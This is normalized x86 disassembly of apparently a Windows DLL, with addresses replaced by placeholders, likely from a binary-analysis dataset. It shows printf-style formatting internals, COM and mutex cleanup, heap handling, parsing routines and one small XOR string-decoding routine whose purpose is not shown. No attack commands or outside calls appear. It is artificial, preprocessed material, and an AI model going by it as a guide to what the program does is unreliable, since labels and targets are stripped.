mov [ ebp - 0x258 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x258 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov ecx [ ebp - 0x210 ]
test cl 0x40
je r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x21c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x274 ] 0x1
mov [ ebp - 0x211 ] dl
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x220 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x220 ]
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push [ ebp - 0x260 ]
call sub_10020a90
and [ ebp - 0x260 ] 0x0
pop ecx
mov eax [ ebp - 0x238 ]
sub eax [ ebp - 0x228 ]
sub eax [ ebp - 0x234 ]
mov [ ebp - 0x268 ] eax
test cl 0xc
jne r-xdata
test ecx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x268 ] eax
jge r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x234 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_10079430
test [ ebp - 0x210 ] 0x8
pop ecx
pop ecx
je r-xdata
mov edi eax
jmp r-xdata
test cl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x254 ]
push eax
push [ ebp - 0x274 ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x268 ]
lea eax [ ebp - 0x280 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
add [ ebp - 0x21c ] 0x4
mov eax [ ebp - 0x21c ]
mov esi [ eax - 0x4 ]
call sub_1002f215
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x228 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x220 ] ecx
je r-xdata
mov edi [ ebp - 0x21c ]
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x228 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test cl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x228 ] esi
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x23c ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x228 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_1006a35a
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x244 ] 0x0
inc eax
add eax 0x2
mov edi [ ebp - 0x264 ]
push eax
push [ ebp - 0x220 ]
lea eax [ ebp - 0x224 ]
call sub_10079430
pop ecx
pop ecx
test eax eax
jle r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_100793fd
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_10028397
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x260 ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x234 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x220 ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x220 ]
mov [ ebp - 0x270 ] eax
test edi edi
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x268 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x220 ] ebx
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x228 ]
cdq
push edx
push eax
push edi
push ebx
call sub_1007b3f0
add ecx 0x30
mov [ ebp - 0x268 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x278 ] eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx ebx
mov al 0x30
dec edi
call sub_100793fd
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_10078ac0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x258 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
push [ ebp - 0x278 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_10079430
cmp [ ebp - 0x270 ] 0x0
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_100793fd
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x270 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x278 ]
push eax
add esi 0x2
call sub_1006a35a
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x220 ]
mov ecx [ ebp - 0x220 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_1001f288
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004c3c5
add esp 0x18
pop ebp
retn
sub_1001f2a8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_1002836c
dec [ ebp + 0x18 ]
jne r-xdata
sub_1001f2e0
push ebp
mov ebp esp
mov edx [ rw-data ]
mov ecx [ edx + 0x10 ]
mov eax [ edx + 0xc ]
push esi
cmp eax ecx
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x10 ]
xor esi esi
cmp ecx esi
jne r-xdata
cmp [ eax ] esi
je r-xdata
cmp ecx 0x2
jne r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
cmp ecx 0x1
jne r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
mov [ eax + 0x4 ] ecx
mov eax ecx
pop esi
pop ebp
retn
mov [ eax + 0x4 ] edx
mov eax edx
pop esi
pop ebp
retn
xor eax eax
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
cmp ecx esi
jle r-xdata
mov [ eax + 0x4 ] esi
mov eax esi
pop esi
pop ebp
retn
sub ecx edx
mov edx [ eax + 0x4 ]
add edx ecx
je r-xdata
mov esi [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
add esi ecx
cmp esi edx
jae r-xdata
add [ eax + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop esi
pop ebp
retn
add [ eax + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop esi
pop ebp
retn
sub_1001f390
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fa58
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xa
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
call [ CoUninitialize@IAT ]
cmp [ ebx + 0x12c ] 0x0
lea eax [ ebx + 0x12c ]
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebx + 0x128 ] 0x0
lea edi [ ebx + 0x128 ]
je r-xdata
push eax
call sub_100326b0
cmp [ ebx + 0x130 ] 0x0
lea esi [ ebx + 0x130 ]
je r-xdata
call sub_10006750
cmp [ ebx + 0x138 ] 0x0
lea edi [ ebx + 0x138 ]
je r-xdata
call sub_10017e40
cmp [ ebx + 0x13c ] 0x0
lea edi [ ebx + 0x13c ]
je r-xdata
call sub_10036a70
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
call sub_10036a70
mov eax [ ebx + 0x120 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
push eax
call [ ReleaseMutex@IAT ]
mov eax [ ebx + 0x20 ]
push eax
call [ CloseHandle@IAT ]
mov eax [ ebx + 0x124 ]
test eax eax
je r-xdata
push eax
call esi
mov [ ebx + 0x120 ] 0x0
mov esi 0x8
cmp [ ebx + 0x118 ] esi
jb r-xdata
push eax
call esi
mov [ ebx + 0x124 ] 0x0
mov edi 0x7
xor edx edx
mov [ ebx + 0x118 ] edi
mov [ ebx + 0x114 ] 0x0
mov [ ebx + 0x104 ] dx
cmp [ ebx + 0xfc ] esi
jb r-xdata
mov ecx [ ebx + 0x104 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebx + 0xfc ] edi
mov [ ebx + 0xf8 ] 0x0
mov [ ebx + 0xe8 ] cx
cmp [ ebx + 0xe0 ] esi
jb r-xdata
mov eax [ ebx + 0xe8 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebx + 0xe0 ] edi
mov [ ebx + 0xdc ] 0x0
mov [ ebx + 0xcc ] ax
cmp [ ebx + 0xc4 ] esi
jb r-xdata
mov edx [ ebx + 0xcc ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebx + 0xc4 ] edi
mov [ ebx + 0xc0 ] 0x0
mov [ ebx + 0xb0 ] dx
cmp [ ebx + 0xa8 ] esi
jb r-xdata
mov ecx [ ebx + 0xb0 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebx + 0xa8 ] edi
mov [ ebx + 0xa4 ] 0x0
mov [ ebx + 0x94 ] cx
cmp [ ebx + 0x8c ] esi
jb r-xdata
mov eax [ ebx + 0x94 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebx + 0x8c ] edi
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x78 ] ax
cmp [ ebx + 0x70 ] esi
jb r-xdata
mov edx [ ebx + 0x78 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebx + 0x70 ] edi
mov [ ebx + 0x6c ] 0x0
mov [ ebx + 0x5c ] dx
cmp [ ebx + 0x54 ] esi
jb r-xdata
mov ecx [ ebx + 0x5c ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebx + 0x54 ] edi
mov [ ebx + 0x50 ] 0x0
mov [ ebx + 0x40 ] cx
cmp [ ebx + 0x38 ] esi
jb r-xdata
mov eax [ ebx + 0x40 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebx + 0x38 ] edi
mov [ ebx + 0x34 ] 0x0
mov [ ebx + 0x24 ] ax
cmp [ ebx + 0x14 ] esi
jb r-xdata
mov edx [ ebx + 0x24 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebx ]
push ecx
call sub_10065045
add esp 0x4
sub_1001f63f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1001f670
push ebp
mov ebp esp
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor ebx ebx
mov edi edx
mov esi ecx
mov ecx [ r--data ]
mov [ ebp - 0xc0 ] edi
mov [ ebp - 0xb8 ] ebx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x61
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
lea ecx [ ebp - 0xb8 ]
push ecx
lea edx [ ebp - 0x24 ]
xor eax eax
push edx
mov [ ebp - 0x12 ] ax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax 0x9a
mov [ ebp - 0xbc ] ebx
call sub_1000a6f0
lea eax [ ebp - 0xbc ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0xae
call sub_1000a6f0
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0xe3
call sub_1000a6f0
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor eax eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
jmp r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x11f
call sub_1000a6f0
mov edi eax
call sub_10053370
mov edi [ ebp - 0xc0 ]
jmp r-xdata
mov ebx [ ebp - 0xb8 ]
mov [ edi ] eax
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xbe
call sub_1000a6f0
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edi [ edi ]
call sub_10068620
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0xbc ]
test ebx ebx
je r-xdata
sub_1001f7e0
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0x4 ]
push eax
push ecx
push edx
mov edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
call sub_10061530
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10010790
test eax eax
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x2
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov esp ebp
pop ebp
retn 0x4
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1001f880
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_10036840
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1001f8a2
push 0x3c
mov eax sub_1007e369
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10042119
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000a135
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1001f9c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_10004dbc
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000794b
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000794b
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_1001fa80
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov ebx ecx
mov eax [ ebx ]
push edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10017b01
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10017b01
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001b974
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_1001b974
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10017b01
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10017b01
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1004cd62
mov edi [ ebp + 0x24 ]
add edi 0x10
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
